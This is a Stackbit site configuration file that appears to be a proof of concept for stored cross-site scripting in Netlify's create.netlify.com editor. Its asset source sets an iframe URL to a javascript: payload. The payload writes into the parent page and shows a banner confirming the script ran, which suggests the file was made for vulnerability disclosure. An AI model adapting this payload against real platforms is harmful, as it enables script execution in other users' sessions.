import { defineStackbitConfig } from '@stackbit/types';
import { GitContentSource } from '@stackbit/cms-git';

export default defineStackbitConfig({
  stackbitVersion: '~0.6.0',
  ssgName: 'custom',
  nodeVersion: '18',
  installCommand: 'npm install',
  devCommand: 'node server.js --port {PORT} --hostname {HOSTNAME}',
  buildCommand: 'npm run build',
  publishDir: 'dist',
  contentSources: [
    new GitContentSource({
      rootPath: __dirname,
      contentDirs: ['content'],
      models: [
        {
          type: 'page',
          name: 'XssProof',
          label: 'Stored XSS Proof',
          urlPath: '/',
          filePath: 'content/index.json',
          fields: [
            { name: 'title', type: 'string', required: true },
            { name: 'description', type: 'text' },
            { name: 'heroImage', type: 'image', source: 'owned-iframe-source' },
            {
              name: 'customControl',
              type: 'string',
              controlType: 'custom-inline-script',
              controlFilePath: 'custom-control.js'
            }
          ]
        }
      ],
      assetsConfig: {
        referenceType: 'static',
        staticDir: 'assets',
        uploadDir: '.',
        publicPath: '/assets/'
      }
    })
  ],
  assetSources: [
    {
      name: 'owned-iframe-source',
      type: 'iframe',
      url: "javascript:(()=>{parent.document.documentElement.setAttribute('data-create-asset-xss','confirmed');let b=parent.document.getElementById('asset-source-xss-proof');if(!b){b=parent.document.createElement('div');b.id='asset-source-xss-proof';parent.document.body.appendChild(b)}b.textContent='SECOND XSS CONFIRMED: asset-source javascript URL executed on create.netlify.com';Object.assign(b.style,{position:'fixed',top:'126px',left:'50%',transform:'translateX(-50%)',zIndex:'2147483647',background:'#7f1d1d',color:'#fff',padding:'12px 18px',borderRadius:'8px',font:'700 14px system-ui'});return '<!doctype html><body>safe marker</body>'})()"
    }
  ]
});
